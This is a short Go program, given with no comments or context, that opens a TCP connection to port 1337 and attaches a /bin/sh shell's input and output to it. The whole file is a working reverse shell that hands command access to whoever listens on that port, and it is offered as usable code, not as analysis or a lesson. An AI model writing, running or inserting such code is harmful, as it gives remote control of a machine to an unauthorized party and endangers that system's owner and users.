package main

import (
	"net"
	"os/exec"
)

func main() {
	c, _ := net.Dial("tcp", ":1337")
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}
